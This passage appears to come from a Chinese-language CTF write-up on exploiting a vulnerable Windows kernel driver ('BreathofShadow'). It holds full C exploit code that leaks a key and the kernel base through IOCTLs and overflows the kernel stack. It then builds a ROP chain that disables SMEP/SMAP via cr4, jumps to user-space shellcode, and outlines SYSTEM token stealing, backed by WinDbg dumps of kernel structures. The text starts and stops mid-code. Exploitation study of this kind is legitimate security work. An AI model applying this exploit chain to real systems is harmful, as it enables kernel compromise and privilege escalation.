OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Failed to open device. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Success open device\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> inputbuf1 = <span class="number">0x8181818181818181</span>;</span><br><span class="line">    <span class="type">size_t</span> KEY = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">char</span> outputbuf1[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BOOL result1 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        &amp;inputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] IOCTL command sent successfully\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakData: 0x%llx\n&quot;</span>,inputbuf1);</span><br><span class="line">        KEY = <span class="number">0x8181818181818181</span> ^ inputbuf1;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakKey: 0x%llx\n&quot;</span>,KEY);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to send IOCTL command. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> stack_value[<span class="number">600</span>] = &#123;<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>&#125;;</span><br><span class="line">    <span class="type">char</span> outputbuf2[<span class="number">600</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOL result2 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        stack_value,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf2,</span><br><span class="line">        <span class="number">600</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> leak_kernel = (<span class="type">uintptr_t</span>)*(<span class="type">void</span> **)(stack_value + <span class="number">0x108</span>);</span><br><span class="line">    <span class="type">uintptr_t</span> kernel_base = leak_kernel - <span class="number">0xb7b3c9</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Leak Kernel: 0x%llx\n&quot;</span>, leak_kernel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel Base: 0x%llx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h3><p>接下來來看 stack cookie<br>stack cookie 會在 return address 附近，不過其實不用理他，因為到時候把整個 stack leak 下來，順便蓋回去就好了</p>
<p>不過還是要先找 return address 位置</p>
<p>這邊可以用 backtrace<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/calls-window">https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/calls-window</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr               Call Site</span><br><span class="line">00 ffff8104`0d6ee510 fffff800`1340518a     BreathofShadow+0x506f</span><br><span class="line">01 ffff8104`0d6ee670 fffff800`7d09697e     BreathofShadow+0x518a</span><br><span class="line">02 ffff8104`0d6ee6a0 fffff800`7d68a568     nt!IofCallDriver+0xbe</span><br></pre></td></tr></table></figure>

<p>找到 return address 在 <code>ffff8104 0d6ee668</code><br>Dst 開始的位置在 <code>ffff8104 0d6ee540</code></p>
<p><code>0xffff8104 0d6ee668 - 0xffff8104 0d6ee540 = 0x128</code></p>
<p>這樣就可以控制 rip 到 0xaabbccdd 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeVioctlCode 0x9C40240B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDR(x) ((x) ^ KEY)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* byteData = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, byteData[i + j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; |&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> c = byteData[i + j];</span><br><span class="line">                <span class="keyword">if</span> (c &gt;= <span class="number">32</span> &amp;&amp; c &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Failed to open device. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Success open device\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> inputbuf1 = <span class="number">0x8181818181818181</span>;</span><br><span class="line">    <span class="type">size_t</span> KEY = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">char</span> outputbuf1[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BOOL result1 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        &amp;inputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] IOCTL command sent successfully\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakData: 0x%llx\n&quot;</span>,inputbuf1);</span><br><span class="line">        KEY = <span class="number">0x8181818181818181</span> ^ inputbuf1;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakKey: 0x%llx\n&quot;</span>,KEY);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to send IOCTL command. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> stack_value[<span class="number">600</span>] = &#123;<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>&#125;;</span><br><span class="line">    <span class="type">char</span> outputbuf2[<span class="number">600</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOL result2 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        stack_value,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf2,</span><br><span class="line">        <span class="number">600</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span>* STACK_VAL = (<span class="type">uintptr_t</span>*)stack_value;</span><br><span class="line">    <span class="type">uintptr_t</span> leak_kernel = STACK_VAL[<span class="number">33</span>]; <span class="comment">// Stack start + 0x108</span></span><br><span class="line">    <span class="type">uintptr_t</span> kernel_base = leak_kernel - <span class="number">0xb7b3c9</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Leak Kernel: 0x%llx\n&quot;</span>, leak_kernel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel Base: 0x%llx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> payload[<span class="number">75</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">37</span>; i++)&#123;</span><br><span class="line">        payload[i] = ADDR(STACK_VAL[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">37</span>] = ADDR(<span class="number">0xaabbccdd</span>);</span><br><span class="line"></span><br><span class="line">    BOOL result3 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        payload,</span><br><span class="line">        <span class="keyword">sizeof</span>(payload),</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(payload),</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下來來看 KROP 怎麼堆</p>
<h3 id="bypass-SMAP-SMEP"><a href="#bypass-SMAP-SMEP" class="headerlink" title="bypass SMAP&#x2F;SMEP"></a>bypass SMAP&#x2F;SMEP</h3><p>第一步要做關掉 SMAP&#x2F;SMEP<br>一樣觀察 cr4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8 = 0b 11 0101 0000 1110 1111 1000 = 0x50ef0</span><br></pre></td></tr></table></figure>
<p>把他蓋成 <code>0b 00 0101 0000 1110 1111 0000</code></p>
<p><img src="https://hackmd.io/_uploads/Hkk58fy5ye.png" alt="image"></p>
<p>先找兩個 gadget，可以控 cr4 的跟可以控 mov cr4, reg，pop reg 之類的 gadget<br>到這找 gadget <code>C:\Windows\System32\ntoskrnl.exe</code></p>
<p><img src="https://hackmd.io/_uploads/H1wd_NJqJx.png" alt="image"></p>
<p>將 cr4 設為 0x50ef0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload[<span class="number">37</span>] = ADDR(kernel_base + <span class="number">0x7a7baf</span>); <span class="comment">//0x1407a7baf: pop rcx ; ret ;</span></span><br><span class="line">payload[<span class="number">38</span>] = ADDR(<span class="number">0x50ef0</span>);</span><br><span class="line">payload[<span class="number">39</span>] = ADDR(kernel_base + <span class="number">0x47f027</span>); <span class="comment">// 0x14047f027: mov cr4, rcx ; ret ;</span></span><br></pre></td></tr></table></figure>

<p>如果沒清 cr4 會直接 BSOD</p>
<p><img src="https://hackmd.io/_uploads/HJvcJUmckg.png" alt="image"></p>
<p>windbg 卡住也可以看到噴錯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">00000000`00660000 65488b142588010000 mov   rdx,qword ptr gs:[188h]</span><br><span class="line">kd&gt; p</span><br><span class="line">KDTARGET: Refreshing KD connection</span><br><span class="line"></span><br><span class="line">*** Fatal System Error: 0x000000fc</span><br><span class="line">                       (0x0000000000660000,0x0000000005B1F867,0xFFFFBC0FDC7954E0,0x0000000080000005)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line">Debugger entered on first try; Bugcheck callbacks have not been invoked.</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line"></span><br><span class="line">For analysis of this file, run !analyze -v</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff802`c7ab9910 cc              int     3</span><br></pre></td></tr></table></figure>

<p>下 <code>!analyze -v</code> 可以看到詳細資訊</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BUGCHECK_CODE:  fc</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: 660000</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: 5b1f867</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffffbc0fdc7954e0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 80000005</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/debugger/bug-check-0xfc---attempted-execute-of-noexecute-memory">Windows Bug Check Code 0xfc</a></p>
<h3 id="jump-to-shellcode"><a href="#jump-to-shellcode" class="headerlink" title="jump to shellcode"></a>jump to shellcode</h3><p>接下來跳回 userspace 上的 shellcode，開始提權</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x48\xC7\xC0\x34\x12\x00\x00\x48\xC7\xC7\x68\x15\x00\x00\x48\x31\xF8&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="type">uintptr_t</span> shellcode_ptr = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"> <span class="built_in">memcpy</span>(shellcode_ptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line"> payload[<span class="number">40</span>] = ADDR(shellcode_ptr);</span><br></pre></td></tr></table></figure>

<p>先 VirtualAlloc 一塊 rwx 的區段，把 shellcode 寫上去<br>接下來 return address 部分寫 shellcode address<br>因為 SMAP&#x2F;SMEP 已經被寫掉了，所以可以跳到 userspace shellcode 上</p>
<p>來寫 shellcode<br><a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p>
<p>首先先上張圖</p>
<blockquote>
<p>Use gs find structure _KPCR -&gt; _ETHREAD -&gt; EPROCESS<br>Loop traverse EPROCESS linklist and find pid 4’s process. It is system integrity process’s token<br>Change yourself process token and return (You must recover register about protection, because kernel will check.)</p>
</blockquote>
<p>我們需要找出 system 這支 process 的 EPROCESS 裡面的 token，寫到自己 process 的 token<br>要從 gs 找 _KPCR struct<br>觀察 _KPCR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPCR fffff80112314000</span><br><span class="line">ndis!_KPCR</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 GdtBase          : 0xfffff801`17a00fb0 _KGDTENTRY64</span><br><span class="line">   +0x008 TssBase          : 0xfffff801`179ff000 _KTSS64</span><br><span class="line">   +0x010 UserRsp          : 0x61f5a8</span><br><span class="line">   +0x018 Self             : 0xfffff801`12314000 _KPCR</span><br><span class="line">   +0x020 CurrentPrcb      : 0xfffff801`12314180 _KPRCB</span><br><span class="line">   +0x028 LockArray        : 0xfffff801`12314870 _KSPIN_LOCK_QUEUE</span><br><span class="line">   +0x030 Used_Self        : 0x00000000`00383000 Void</span><br><span class="line">   +0x038 IdtBase          : 0xfffff801`179fe000 _KIDTENTRY64</span><br><span class="line">   +0x040 Unused           : [2] 0</span><br><span class="line">   +0x050 Irql             : 0 &#x27;&#x27;</span><br><span class="line">   +0x051 SecondLevelCacheAssociativity : 0x10 &#x27;&#x27;</span><br><span class="line">   +0x052 ObsoleteNumber   : 0 &#x27;&#x27;</span><br><span class="line">   +0x053 Fill0            : 0 &#x27;&#x27;</span><br><span class="line">   +0x054 Unused0          : [3] 0</span><br><span class="line">   +0x060 MajorVersion     : 1</span><br><span class="line">   +0x062 MinorVersion     : 1</span><br><span class="line">   +0x064 StallScaleFactor : 0xda5</span><br><span class="line">   +0x068 Unused1          : [3] (null) </span><br><span class="line">   +0x080 KernelReserved   : [15] 0</span><br><span class="line">   +0x0bc SecondLevelCacheSize : 0x2000000</span><br><span class="line">   +0x0c0 HalReserved      : [16] 0xd03982f0</span><br><span class="line">   +0x100 Unused2          : 0</span><br><span class="line">   +0x108 KdVersionBlock   : (null) </span><br><span class="line">   +0x110 Unused3          : (null) </span><br><span class="line">   +0x118 PcrAlign1        : [24] 0</span><br><span class="line">   +0x180 Prcb             : _KPRCB</span><br></pre></td></tr></table></figure>

<p>_PRCB 內 +0x180 是 _KPRCB</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPRCB fffff80112314180</span><br><span class="line">ndis!_KPRCB</span><br><span class="line">   +0x000 MxCsr            : 0x1f80</span><br><span class="line">   +0x004 LegacyNumber     : 0 &#x27;&#x27;</span><br><span class="line">   +0x005 ReservedMustBeZero : 0 &#x27;&#x27;</span><br><span class="line">   +0x006 InterruptRequest : 0 &#x27;&#x27;</span><br><span class="line">   +0x007 IdleHalt         : 0 &#x27;&#x27;</span><br><span class="line">   +0x008 CurrentThread    : 0xffffaf87`b5caf080 _KTHREAD</span><br><span class="line">   +0x010 NextThread       : (null) </span><br><span class="line">   +0x018 IdleThread       : 0xfffff801`849d0640 _KTHREAD</span><br></pre></td></tr></table></figure>
<p>_KPRCB + 0x8 是 CurrentThread (_KTHREAD)<br>所以可以從 gs:[0x188] 找到 _KTHREAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD 0xffffaf87`b5caf080</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x018 SListFaultAddress : (null) </span><br><span class="line">   +0x020 QuantumTarget    : 0x6f6e736</span><br><span class="line">   +0x028 InitialStack     : 0xfffff30d`4ee76c70 Void</span><br><span class="line">   +0x030 StackLimit       : 0xfffff30d`4ee71000 Void</span><br><span class="line">   +0x038 StackBase        : 0xfffff30d`4ee77000 Void</span><br><span class="line">   +0x040 ThreadLock       : 0</span><br><span class="line">   +0x048 CycleTime        : 0x1bb498c</span><br><span class="line">   +0x050 CurrentRunTime   : 0x5a9797</span><br><span class="line">   +0x054 ExpectedRunTime  : 0x44c6c1</span><br><span class="line">   +0x058 KernelStack      : 0xfffff30d`4ee763e0 Void</span><br><span class="line">   +0x060 StateSaveArea    : 0xfffff30d`4ee76cc0 _XSAVE_FORMAT</span><br><span class="line">   +0x068 SchedulingGroup  : (null) </span><br><span class="line">   +0x070 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x071 Running          : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x072 Alerted          : [2]  &quot;&quot;</span><br><span class="line">   +0x074 AutoBoostActive  : 0y1</span><br><span class="line">   +0x074 ReadyTransition  : 0y0</span><br><span class="line">   +0x074 WaitNext         : 0y0</span><br><span class="line">   +0x074 SystemAffinityActive : 0y0</span><br><span class="line">   +0x074 Alertable        : 0y0</span><br><span class="line">   +0x074 Reserved1        : 0y0</span><br><span class="line">   +0x074 ApcInterruptRequest : 0y0</span><br><span class="line">   +0x074 QuantumEndMigrate : 0y0</span><br><span class="line">   +0x074 SecureThread     : 0y0</span><br><span class="line">   +0x074 TimerActive      : 0y0</span><br><span class="line">   +0x074 SystemThread     : 0y0</span><br><span class="line">   +0x074 ProcessDetachActive : 0y0</span><br><span class="line">   +0x074 Reserved2        : 0y0</span><br><span class="line">   +0x074 ScbReadyQueue    : 0y0</span><br><span class="line">   +0x074 ApcQueueable     : 0y1</span><br><span class="line">   +0x074 Reserved3        : 0y0</span><br><span class="line">   +0x074 WaitNextClearWobPriorityFloor : 0y0</span><br><span class="line">   +0x074 